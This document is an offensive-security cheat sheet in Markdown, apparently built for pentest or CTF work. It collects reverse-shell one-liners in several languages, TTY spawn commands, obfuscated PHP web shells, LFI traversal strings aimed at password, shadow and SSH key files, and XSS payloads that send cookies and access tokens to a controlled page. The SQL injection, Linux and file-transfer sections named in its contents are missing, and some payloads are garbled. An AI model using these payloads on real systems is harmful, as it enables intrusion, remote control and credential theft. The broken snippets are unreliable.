____

### Reverse shell
* #### [Bash](#reverse_shell_bash)
* #### [Python](#reverse_shell_python)
* #### [Netcat](#reverse_shell_netcat)
* #### [PHP](#reverse_shell_php)
* #### [Telnet](#reverse_shell_telnet)
* #### [Ruby](#reverse_shell_ruby)
* #### [Perl](#reverse_shell_perl)
### TTY Spawn Shell
* #### [Python spawn shell](#python_spawn_shell)
* #### [OS system spawn shell](#os_system_spawn_shell)
* #### [Bash spawn shell](#bash_spawn_shell)
* #### [Perl spawn shell](#perl_spawn_shell)
* #### [Ruby spawn shell](#ruby_spawn_shell)
* #### [Lua spawn shell](#lua_spawn_shell)
* #### [IRB spawn shell](#irb_spawn_shell)
* #### [VI spawn shell](#vi_spawn_shell)
* #### [VI(2) spawn shell](#vi2_spawn_shell)
* #### [Nmap spawn shell](#nmap_spawn_shell)
### PHP Reverse Shell
* #### [RCE](#rce_vuln)
* #### [Obfuscate PHP Web Shell](#obfuscate_php_web_shell)
* #### [PHP Reverse Shell](#php_reverse_shell)
### LFI
* #### [Directory Traversal](#directory_traversal)
* #### [PHP Wrapper php://file](#php_wrapper_file)
* #### [PHP Wrapper php://filter](#php_wrapper_filter)
* #### [Useful LFI files (Linux)](#useful_lfi_linux)
* #### [Useful LFI files (Apache)](#useful_lfi_apache)
* #### [Useful LFI files (MySQL)](#useful_lfi_mysql)
* #### [Useful LFI files (Windows)](#useful_lfi_windows)
### XSS
* #### [Data grabber for XSS](#data_grabber_xss)
* #### [XSS in HTML/Applications](#xss_in_app)
  * ##### [Basic Payload](#basic_payload)
  * ##### [Img tag payload](#img_tag_payload)
* #### [XSS in Markdown](#xss_in_markdown)
* #### [XSS in SVG](#xss_in_svg)
* #### [Bypass word blacklist with code evaluation](#bypass_word_blacklist_with_code_evaluation)
### SQL Injection Payloads
* #### [Generic SQL Injection](#generic_sql_injection)
* #### [Time-Based](#time_based)
* #### [Generic Error Based Payloads](#generic_error_based_payloads)
* #### [Authentication Based Payloads](#authentication_based_payloads)
* #### [Order by and UNION Based Payloads](#order_by_and_union_based_payloads)
### Useful Linux command
* #### [SUID Commands](#suid_commands)
* #### [System Version](#system_version)
* #### [Environment Variables](#environment_variables)
* #### [Service Settings](#service_settings)
* #### [Cron Jobs](#cron_jobs)
* #### [Other Users](#other_users)
* #### [Port Forwarding](#port_forwarding)
* #### [TAR Wildcard Cronjob Privilege Escalation](#tar_wildcard_cronjob_privilege_escalation)
### File Transfer
* #### [Bash Upload](#bash_upload)
* #### [Bash Download](#bash_download)
* #### [Netcat](#netcat)
* #### [Python](#python)
* #### [SCP](#scp)

____

### Reverse shell > <a name="reverse_shell_bash"></a>Bash
###### bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1234 <&1'

### Reverse shell > <a name="reverse_shell_python"></a>Python
```python  
python -c 'import sys,socket,os,pty;s=socket.socket()
  s.connect((os.getenv("127.0.0.1"),int(os.getenv("1234"))))
  [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
  pty.spawn("/bin/sh")'
```

### Reverse shell > <a name="reverse_shell_netcat"></a>Netcat
###### rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f

### Reverse shell > <a name="reverse_shell_php"></a>PHP
###### php -r '$sock=fsockopen(getenv("127.0.0.1"),getenv("1234"));exec("/bin/sh -i <&3 >&3 2>&3");'

### Reverse shell > <a name="reverse_shell_telnet"></a>Telnet
###### TF=$(mktemp -u); mkfifo $TF && telnet 127.0.0.1 1234 0<$TF | /bin/sh 1>$TF

### Reverse shell > <a name="reverse_shell_ruby"></a>Ruby
###### ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["127.0.0.1"],ENV["1234"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

### Reverse shell > <a name="reverse_shell_perl"></a>Perl
###### perl -e 'use Socket;$i="$ENV{127.0.0.1}";$p=$ENV{1234};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

____

### TTY Spawn Shell > <a name="python_spawn_shell"></a>Python spawn shell
###### python -c 'import pty; pty.spawn("/bin/sh")'

### TTY Spawn Shell > <a name="os_system_spawn_shell"></a>OS system spawn shell
###### echo os.system("/bin/bash")

### TTY Spawn Shell > <a name="bash_spawn_shell"></a>Bash spawn shell
###### /bin/sh -i

### TTY Spawn Shell > <a name="perl_spawn_shell"></a>Perl spawn shell
###### perl —e 'exec "/bin/sh";'

### TTY Spawn Shell > <a name="ruby_spawn_shell"></a>Ruby spawn shell
###### ruby: exec "/bin/sh"

### TTY Spawn Shell > <a name="lua_spawn_shell"></a>Lua spawn shell
###### lua: os.execute("/bin/sh")

### TTY Spawn Shell > <a name="irb_spawn_shell"></a>IRB spawn shell
###### exec "/bin/sh"

### TTY Spawn Shell > <a name="vi_spawn_shell"></a>VI spawn shell
###### :!bash

### TTY Spawn Shell > <a name="vi2_spawn_shell"></a>VI(2) spawn shell
###### :set shell=/bin/bash:shell

### TTY Spawn Shell > <a name="nmap_spawn_shell"></a>Nmap spawn shell
###### !sh

____

### PHP Reverse Shell > <a name="rce_vuln"></a>RCE
```php
<?php system($_GET["cmd"]);?
```
### PHP Reverse Shell > <a name="obfuscate_php_web_shell"></a>Obfuscate PHP Web Shell
```php
<?=`$_GET[0]`?>
Example: http://site.com/path/to/shell.php?0=command 
```
```php
<?=`$_POST[0]`?>
Example: curl -X POST http://site.com/path/to/shell.php -d "0=command" 
```
```php
<?=`{$_REQUEST['_']}`?>
Example: http://site.com/path/to/shell.php?_=command
```
```php
curl -X POST http://site.com/path/to/shell.php -d "_=command" '
```
```php
<?=$_="";$_="'" ;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
Example: http://site.com/path/to/shell.php?0=command
```
```php
<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>
Example:
http://site.com/path/to/shell.php?_=function&__=argument
http://site.com/path/to/shell.php?_=system&__=ls
```
### PHP Reverse Shell > <a name="php_reverse_shell"></a>PHP Reverse Shell (Pentestmonkey)
###### https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

____

### LFI > <a name="directory_traversal"></a>Directory Traversal
###### some.php?file=../../../../../../../etc/passwd

### LFI > <a name="php_wrapper_file"></a>PHP Wrapper php://file
###### example.php?page=expect://ls

### LFI > <a name="php_wrapper_filter"></a>PHP Wrapper php://filter
###### example.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd

### LFI > <a name="useful_lfi_linux"></a>Useful LFI files (Linux)
```html
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/authorized_keys
/home/user/.ssh/id_rsa
/proc/[0-9]*/fd/[0-9]*
/proc/mounts
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/var/run/secrets/kubernetes.io/serviceaccount
/var/lib/mlocate/mlocate.db
/var/lib/mlocate.db
```
### LFI > <a name="useful_lfi_apache"></a>Useful LFI files (Apache)
```html
/etc/apache2/apache2.conf
/usr/local/etc/apache2/httpd.conf
/etc/httpd/conf/httpd.conf
Red Hat/CentOS/Fedora Linux -> /var/log/httpd/access_log
Debian/Ubuntu -> /var/log/apache2/access.log
FreeBSD -> /var/log/httpd-access.log
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/apache2/access.log
/var/log/apache/error.log
```
### LFI > <a name="useful_lfi_mysql"></a>Useful LFI files (MySQL)
```html
/var/lib/mysql/mysql/user.frm
/var/lib/mysql/mysql/user.MYD
/var/lib/mysql/mysql/user.MYI
```
### LFI > <a name="useful_lfi_windows"></a>Useful LFI files (Windows)
```html
/boot.ini
/autoexec.bat
/windows/system32/drivers/etc/hosts
/windows/repair/SAM
/windows/panther/unattended.xml
/windows/panther/unattend/unattended.xml
/windows/system32/license.rtf
/windows/system32/eula.txt
```

____


### XSS > <a name="data_grabber_xss"></a>Data grabber for XSS
###### Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.
```html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>

<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>

<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>

<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>
```

### XSS > <a name="xss_in_app"></a>XSS in HTML/Applications
### XSS > <a name="basic_payload"></a>Basic Payload
```html
<script>alert('XSS')</script>

<scr<script>ipt>alert('XSS')</scr<script>ipt>

"><script>alert("XSS")</script>

"><script>alert(String.fromCharCode(88,83,83))</script>
```
### XSS > <a name="img_tag_payload"></a>Img tag payload
```html
<img src=x onerror=alert('XSS');>

<img src=x onerror=alert('XSS')//
     
<img src=x onerror=alert(String.fromCharCode(88,83,83));>

<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>

<img src=x:alert(alt) onerror=eval(src) alt=xss>

"><img src=x onerror=alert("XSS");>

"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
```

### XSS > <a name="xss_in_markdown"></a>XSS in Markdown
```html
[a](javascript:prompt(document.cookie))

[a](j a v a s c r i p t:prompt(document.cookie))

[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)

[a](javascript:window.onerror=alert;throw%201)
```
### XSS > <a name="xss_in_svg"></a>XSS in SVG
```html
<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>

<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
 
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
 
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```
### XSS > <a name="bypass_word_blacklist_with_code_evaluation"></a>Bypass word blacklist with code evaluation
```html
eval('ale'+'rt(0)');

Function('ale'+'rt(1)')();

new Function`alert`6``;

setTimeout('ale'+'rt(2)');

setInterval('ale'+'rt(10)');

Set.constructor('ale'+'rt(13)')();

Set.constructor`alert(14)```;
```
